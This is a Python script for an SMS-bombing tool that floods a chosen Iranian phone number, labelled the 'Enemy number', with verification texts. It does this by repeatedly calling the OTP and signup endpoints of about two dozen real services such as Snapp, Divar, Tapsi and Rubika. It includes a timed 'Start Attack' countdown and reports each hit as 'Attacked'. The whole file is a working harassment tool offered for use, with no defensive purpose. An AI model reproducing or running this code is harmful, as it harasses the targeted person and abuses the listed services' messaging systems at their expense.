from requests import post , get
from colorama import init , Fore
from os import system , name
from time import sleep
from pyfiglet import Figlet
init()

     
def logo ():     
    print(Fore.RED+'''
 #####                                    #     #
#     # #        ##    ####  #    #       ##   ##   ##    ####  #    #
      # #       #  #  #    # #   #        # # # #  #  #  #      #   #
 #####  #      #    # #      ####         #  #  # #    #  ####  ####
      # #      ###### #      #  #         #     # ######      # #  #
#     # #      #    # #    # #   #        #     # #    # #    # #   #
 #####  ###### #    #  ####  #    #       #     # #    #  ####  #    # \nBM TEAM:\n\n''')
def clear():
    if name == 'nt':
        _ = system('cls')
    else:
        _ = system('clear')

sended =[]
clear()
logo()
while True :  
    try:
        phone_number = str(input("[ ] Enemy number:\n>>+98 "))
        sms_number = int(input("[ ] Number of sms:\n>>"))
        shutdown = str(input(Fore.GREEN+"\n\n>>shutdown your system after work?\n[y or n]\n>>")).lower()
        save = str(input(Fore.GREEN+"\n\n>>save result?\n[y or n]\n>>")).lower()
        if shutdown and save == "y" or "n":
            break
        else:
            print (Fore.RED+"Invalid Input")
            sleep(2)
            clear()    
    except: 
        print (Fore.RED+"eror")
        input (Fore.WHITE+"Press Enter...")
        clear() 
clear()  
def TimeSend():
    w = 1
    while w == 1:
        try:
                st = int(input(Fore.GREEN+"why?\n1)Start Now\n2)Time To Start\n\n>>"))
                clear()
                if st == 1 :
                    break  
                elif st == 2 :
                    timeattack = float(input("[ ] Time for Start Attack(m):\n>>"))
                    time_send = timeattack * 60
                    print(str(time_send))
                    while  True:
                        clear()
                        logo()
                        text = int(time_send)
                        maker=Figlet(font = "banner3-d")
                        banner = maker.renderText(str(text))
                        
                        print(Fore.GREEN+"Start Attack :\n\n"+banner)      
                        time_send -= 1
                        
                        sleep(1)
                        if int(time_send) == -1 :
                            clear()
                            logo()
                            break
                        else : pass
                else : 
                    print (Fore.RED+"Invalid Input")
                    sleep(2)
                    clear()    
                w = 0
        except: 
            print (Fore.RED+"eror")
            input (Fore.WHITE+"Press Enter...")
def start():
    try:
        looping_count = 0
        clear()
        logo()
        print("\n\n")
        while looping_count <= sms_number:
            if sended.count(1) >= sms_number:
                clear()
                log(looping_count, sms_number, phone_number)
                print("\n[ ] Done, I sent more than {} sms to +98 {}\n".format(sms_number, phone_number ))
                break
            else:
                log(looping_count, sms_number, phone_number)
                looping_count = looping_count + 1
                snap(phone_number)
                sleep(0.3)
                tamland(phone_number)
                sleep(0.5)
                alibaba(phone_number)
                sleep(.3)
                tapsi(phone_number)
                sleep(0.5)
                divar(phone_number)
                sleep(0.3)
                sbm24(phone_number)
                sleep(0.5)
                anten(phone_number)
                sleep(0.3)
                snap_doctor(phone_number)
                sleep(0.5)
                togmond(phone_number)
                sleep(0.3)
                torob(phone_number)
                sleep(0.5)
                limited_sites(phone_number)
                sleep(0.3)
                snap_room(phone_number)
                sleep(0.5)
                hamrahcard(phone_number)
                sleep(0.3)
                shad(phone_number)
                sleep(0.5)
                snappfood(phone_number)
                sleep(0.3)
                lenz(phone_number)
                sleep(0.5)
                namava(phone_number)
                sleep(0.3)
                Rubika(phone_number)
                sleep(0.5)
                bama(phone_number)
                sleep(0.3)
                snapptrip(phone_number)
                sleep(0.5)
                hamyarzaban(phone_number)
                sleep(0.3)
                idifeng(phone_number)
                sleep(0.5)
                passhujiangcom(phone_number)
                sleep(0.3)
                zgtvspo38igeekgq(phone_number)
                sleep(0.5)
                apiwanwudezhicom(phone_number)
    except:
        print (Fore.RED+"eror")
        input (Fore.WHITE+"Press Enter...")
        clear()   
def snap(phone_number):
    try:
        phone_number = "+98" + phone_number
        data = {"cellphone":phone_number}
        url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
        p = post(url, json=data, timeout=2)
        sleep(.01)
        rp = p.status_code
        if rp == 200 :
            sended.append(1)
            print("[snap] send post and : {}".format(p))
        else:
            print("[-snap] not send , error code:{}".format(p))
            sended.append(0)
    except:
        print("[-snap] not send check internet or somting..")
        sended.append(-1)
def tamland(phone_number):
    try:
        phone_number = "0" + phone_number
        data = {"Mobile":phone_number,"SchoolId":-1}
        url = "https://api.famiran.com/api/user/signup"
        p = post(url, json=data, timeout=2)
        sleep(.01)
        rp = p.status_code
        if rp == 200 :
            sended.append(1)
            print("[tamland] send post and : {}".format(p))
        else:
            print("[-tamland] not send , error code: {}".format(p))
            sended.append(0)
    except:
        print("[-tamland] not send check internet or somting..")
        sended.append(-1)
def alibaba(phone_number):
    try:
        phone_number = phone_number
        url = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
        data = {"phoneNumber":phone_number}
        p = post(url, json=data, timeout=3)
        sleep(.01)
        rp = p.status_code
        if rp == 200 :
            sended.append(1)
            print("[alibaba] send post and : {}".format(p))
        else: 
            print("[-alibaba] not send , error code: {}".format(p))
            sended.append(0)
    except:
        print("[-alibaba] not send check internet or somting..")
        sended.append(-1)
def tapsi(phone_number):
    try:
        phone_number = "0" + phone_number
        data = {"credential":{"phoneNumber":phone_number,"role":"PASSENGER"}}
        url = "https://tap33.me/api/v2/user"
        p = post(url, json=data, timeout=2 )
        sleep(.01)
        rp = p.status_code
        if rp == 200:
            sended.append(1)
            print("[tapsi] send post and : {}".format(p))
        else:
            print("[-tapsi] not send , error code: {}".format(p))
            sended.append(0)
    except:
        print("[-tapsi] not send check internet or somting..")
        sended.append(-1)
def divar(phone_number):
    try:
        phone_number = phone_number
        data = {"phone":phone_number}
        url = "https://api.divar.ir/v5/auth/authenticate"
        p = post(url, json=data, timeout=2)
        rp = p.status_code
        sleep(.01)
        if rp == 200:
            sended.append(1)
            print("[divar] send post and : {}".format(p))
        else:
            print("[-divar] not send , error code: {}".format(p))
            sended.append(0)
    except:
        print("[-divar] not send check internet or somting..")
        sended.append(-1)
def sbm24(phone_number):
    try:
        data = {}
        url = "https://sandbox.sbm24.net/api/v2/authenticate/send-confirmation-code?mobile=0{}".format(phone_number)
        p = post(url, json=data, timeout=3)
        rp = p.status_code
        sleep(.01)
        if rp == 200:
            sended.append(1)
            print("[sbm24] send post and : {}".format(p))
        else:
            print("[-sbm24] not send , error code: {}".format(p))
            sended.append(0)
    except:
        print("[-sbm24] not send check internet or somting..")
        sended.append(-1)
def snap_market(phone_number):
    try:
        data = {}
        url = "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{}&dummy=1603885783456".format(phone_number)
        p = post(url, json=data, timeout=3)
        rp = p.status_code
        sleep(.01)
        if rp == 200:
            sended.append(1)
            print("[snap_market] send post and : {}".format(p))
        else:
            print("[-snap_market] not send , error code: {}".format(p))
            sended.append(0)
    except:
        print("[-snap_market] not send check internet or somting..")
        sended.append(-1)
def anten(phone_number):
    try:
        phone_number = '0'+phone_number
        data = {"phone":phone_number}
        url = "https://api2.anten.ir/users/"
        p = post(url, json=data, timeout=3)
        rp = p.status_code
        sleep(.01)
        if rp == 200:
            sended.append(1)
            print("[anten] send post and : {}".format(p))
        else:
            print("[-anten] not send , error code: {}".format(p))
            sended.append(0)
    except:
        print("[-anten] not send check internet or somting..")
        sended.append(-1)
def snap_doctor(phone_number):
    try:
        url = "https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/0{}/sms?cCode=+98)".format(phone_number)
        p = get(url, timeout=3)
        rp = p.json()
        rp = rp["result"]
        sleep(.01)
        if rp == "SUCCESS":
            sended.append(1)
            print("[snap doctor] send get and : {}".format(rp))
    except:
        print("[-snap doctor] not send check internet or somting..")
        sended.append(-1)
def togmond(phone_number):
    try:
        phone_number = phone_number
        data = "utf8=%E2%9C%93&phone_number=0{}".format(phone_number)
        url = "https://tagmond.com/phone_number"
        p = post(url, data=data, timeout=3)
        rp = p.status_code
        sleep(.01)
        if rp == 200:
            sended.append(2)
            print("[togmond] send post and : {}".format(p))
        else:
            print("[-togmond] not send , error code: {}".format(p))
            sended.append(0)
    except:
        print("[-togmond] not send check internet or somting..")
        sended.append(-1)
def torob(phone_number):
    try:
        url = "https://api.torob.com/a/phone/send-pin/?phone_number=0{}".format(phone_number)
        p = get(url, timeout=3)
        rp = p.status_code
        sleep(.01)
        if rp == 200:
            sended.append(1)
            print("[torob] send post and : {}".format(p))
        else:
            print("[-torob] not send , error code: {}".format(p))
            sended.append(0)
    except:
        print("[-torob] not send check internet or somting..")
        sended.append(-1)
def limited_sites(phone_number):
    try:
        data = {"username":phone_number}     
        url = "https://www.tebinja.com/api/v1/users"
        post(url, json=data, timeout=1)
        sleep(.01)
    except:
        sended.append(2)
def snap_room(phone_number):
    try:
        data = {"username":"0"+phone_number}    
        url = "https://napi.snapproom.com/users/self/verification-flow"
        p = post(url, json=data, timeout=2)
        sleep(.01)
        rp = p.status_code
        if rp == 200:
            sended.append(1)
            print("[snap room] send post and : {}".format(p))
        else:
            print("[-snap room] not send , error code: {}".format(p))
            sended.append(0)
    except:
        print("[-snap room] not send check internet or somting..")
        sended.append(-1)
def hamrahcard(phone_number):
    try:
        data = {'action':'getAppViaSMS','number':phone_number}    
        url = "https://hamrahcard.ir/wp-admin/admin-ajax.php"
        p = post(url, json=data, timeout=2)
        sleep(.01)
        rp = p.status_code
        if rp == 200:
            sended.append(1)
            print("[hamrahcard] send post and : {}".format(p))
        else:
            print("[-hamrahcard] not send , error code: {}".format(p))
            sended.append(0)
    except:
        print("[-hamrahcard] not send check internet or somting..")
        sended.append(-1)
def shad(phone_number):
    try:
        data ={"api_version":"3","method":"sendCode","data":{"phone_number":phone_number,"send_type":"SMS"}} 
        url = "https://shadmessenger103.iranlms.ir/"
        p = post(url, json=data, timeout=2)
        sleep(.01)
        rp = p.status_code
        if rp == 200:
            sended.append(1)
            print("[shad] send post and : {}".format(p))
        else:
            print("[-shad] not send , error code: {}".format(p))
            sended.append(0)
    except:
        print("[-shad] not send check internet or somting..")
        sended.append(-1)
def snappfood(phone_number):
    try:
        data ={'cellphone':phone_number}  
        url = "https://snappfood.ir/customer/app-dl/send"
        p = post(url, json=data, timeout=2)
        sleep(.01)
        rp = p.status_code
        if rp == 200:
            sended.append(1)
            print("[snappfood] send post and : {}".format(p))
        else:
            print("[-snappfood] not send , error code: {}".format(p))
            sended.append(0)
    except:
        print("[-snappfood] not send check internet or somting..")
        sended.append(-1)
def lenz(phone_number):
    try:
        data = {"msisdn":str(phone_number)}    
        url = "https://app.lenz.ir:64014/api/v2/auth/register/otp/generate"
        p = post(url, json=data, timeout=2)
        sleep(.01)
        rp = p.status_code
        if rp == 200:
            sended.append(1)
            print("[lenz] send post and : {}".format(p))
        else:
            print("[-lenz] not send , error code: {}".format(p))
            sended.append(0)
    except:
        print("[-lenz] not send check internet or somting..")
        sended.append(-1)
def namava(phone_number):
    try:
        data = {"UserName":phone_number}    
        url = "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request"
        p = post(url, json=data, timeout=2)
        sleep(.01)
        rp = p.status_code
        if rp == 200:
            sended.append(1)
            print("[namava] send post and : {}".format(p))
        else:
            print("[-namava] not send , error code: {}".format(p))
            sended.append(0)
    except:
        print("[-namava] not send check internet or somting..")
        sended.append(-1)
def Rubika(phone_number):
    try:
        data = {"api_version":"3","method":"sendCode","data":{"phone_number":phone_number,"send_type":"SMS"}}    
        url = "https://messengerg2c53.iranlms.ir/"
        p = post(url, json=data, timeout=2)
        sleep(.01)
        rp = p.status_code
        if rp == 200:
            sended.append(1)
            print("[Rubika] send post and : {}".format(p))
        else:
            print("[-Rubika] not send , error code: {}".format(p))
            sended.append(0)
    except:
        print("[-Rubika] not send check internet or somting..")
        sended.append(-1)
def bama(phone_number):
    try:
        data = {'cellNumber':phone_number}    
        url = 'https://bama.ir/signin-checkforcellnumber'
        p = post(url, json=data, timeout=2)
        sleep(.01)
        rp = p.status_code
        if rp == 200:
            sended.append(1)
            print("[bama] send post and : {}".format(p))
        else:
            print("[-bama] not send , error code: {}".format(p))
            sended.append(0)
    except:
        print("[-bama] not send check internet or somting..")
        sended.append(-1)
def snapptrip(phone_number):
    try:
        data ={"lang":"fa","country_id":"860","password":"fhj5tvT6D9jWkPw","mobile_phone":phone_number,"country_code":"+98"}   
        url = "https://www.snapptrip.com/register"
        p = post(url, json=data, timeout=2)
        sleep(.01)
        rp = p.status_code
        if rp == 200:
            sended.append(1)
            print("[snapptrip] send post and : {}".format(p))
        else:
            print("[-snapptrip] not send , error code: {}".format(p))
            sended.append(0)
    except:
        print("[-snapptrip] not send check internet or somting..")
        sended.append(-1)
def hamyarzaban(phone_number):
    try:
        data ={'phone':phone_number}  
        url = "https://hamyarzaban.com/wp-content/themes/hamyarzaban/sms.php"
        p = post(url, json=data, timeout=2)
        sleep(.01)
        rp = p.status_code
        if rp == 200:
            sended.append(1)
            print("[hamyarzaban] send post and : {}".format(p))
        else:
            print("[-hamyarzaban] not send , error code: {}".format(p))
            sended.append(0)
    except:
        print("[-hamyarzaban] not send check internet or somting..")
        sended.append(-1)
def idifeng(phone_number):
    try:
        data = {"username":"+98"+phone_number}    
        url = "http://id.ifeng.com/api/simplesendmsg?mobile=%s"
        p = post(url, json=data, timeout=2)
        sleep(0)
        rp = p.status_code
        if rp == 200:
            sended.append(1)
            print("[id.ifeng] Attacked : {}".format(p))
        else:
            print("[-id.ifeng] Bad Post, error code: {}".format(p))
            sended.append(0)
    except:
        print("[-id.ifeng] Connection Time Out..")
        sended.append(-1)
def passhujiangcom(phone_number):
    try:
        data = {"username":"+98"+phone_number}    
        url = "https://pass.hujiang.com/v2/api/v1/sms/send?action=SendMsg&mobile=%s"
        p = post(url, json=data, timeout=2)
        sleep(0)
        rp = p.status_code
        if rp == 200:
            sended.append(1)
            print("[pass.hujiang] Attacked : {}".format(p))
        else:
            print("[-pass.hujiang] Bad Post, error code: {}".format(p))
            sended.append(0)
    except:
        print("[-pass.hujiang] Connection Time Out..")
        sended.append(-1)
def zgtvspo38igeekgq(phone_number):
    try:
        url = "http://zgtv.spo38.igeek.gq/aip/index3.php?hm={}".format(phone_number)
        p = get(url, timeout=3)
        rp = p.status_code
        sleep(0)
        if rp == 200:
            sended.append(1)
            print("[zgtv.spo38.igeek] Attacked : {}".format(p))
        else:
            print("[-zgtv.spo38.igeek] Bad Post, error code: {}".format(p))
            sended.append(0)
    except:
        print("[-zgtv.spo38.igeek] Connection Time Out..")
        sended.append(-1)
def apiwanwudezhicom(phone_number):
    try:
        data = {"username":"+98"+phone_number}    
        url = "https://api.wanwudezhi.com/module-user/api/v1/user/sendSmsCode?phone=%s"
        p = post(url, json=data, timeout=2)
        sleep(0)
        rp = p.status_code
        if rp == 200:
            sended.append(1)
            print("[api.wanwudezhi] Attacked : {}".format(p))
        else:
            print("[-api.wanwudezhi] Bad Post, error code: {}".format(p))
            sended.append(0)
    except:
        print("[-api.wanwudezhi] Connection Time Out..")
        sended.append(-1)
clear() 
def log(looping_count, sms_number, phone_number):
    try:
        clear()
        logo()

        return_200 = str(sended.count(1))
        return_error = str(sended.count(0))
        return_internet_error = str(sended.count(-1))
        if save == "y":
            with open ("result-SMSBMBR.txt","w")as res:
                    fin = ("----------------------------------------------------\n"),("[-] target : 98 {}".format(phone_number)+"\n"),("\n\n[*] send: {}/{}    site error: {}    internet error: {}".format(return_200, sms_number, return_error, return_internet_error)+"\n"),("\n[*] all lo0ping script : {}".format(looping_count)+"\n"),("----------------------------------------------------"+"\n")
                    res.writelines(fin)
        print("----------------------------------------------------")
        print("[-] target : 98 {}".format(phone_number))
        print("\n\n[*] send: {}/{}    site error: {}    internet error: {}".format(return_200, sms_number, return_error, return_internet_error))
        print("\n[*] all lo0ping script : {}".format(looping_count))
        print("----------------------------------------------------")
    except:
        print (Fore.RED+"eror")
        input (Fore.WHITE+"Press Enter...")
        clear()         
site_function = 13            
if __name__ == "__main__":
    x = 1
    while x == 1:
        try:
            logo()
            TimeSend()
            start()
            if shutdown == "y":
                sleep(300)
                system("shutdown -s")
            xx = int(input(Fore.WHITE+"1)retry\n2)exit\n\n>>"))
            clear()
            if xx == 1 :
                while True :  
                    try:
                        phone_number = str(input(Fore.RED+"[ ] Enemy number:\n>>+98 "))
                        sms_number = int(input(Fore.RED+"[ ] Number of sms:\n>>"))
                        shutdown = str(input(Fore.GREEN+"\n\n>>shutdown your system after work?\n[y or n]\n>>")).lower()
                        save = str(input(Fore.GREEN+"\n\n>>save result?\n[y or n]\n>>")).lower()
                        if shutdown and save == "y" or "n":
                            break
                        else:
                            print (Fore.RED+"Invalid Input")
                            sleep(2)
                            clear()    
                    except: 
                        print (Fore.RED+"eror")
                        input (Fore.WHITE+"Press Enter...")
                        clear() 
                clear()  
            elif xx == 2 :
                x = 0
            else : 
                print(Fore.RED+"invalid password")
                input(Fore.WHITE+"press Enter..."+Fore.BLACK)
        except:
            print (Fore.RED+"eror")
            input (Fore.WHITE+"Press Enter...")
            clear()
            
        
    
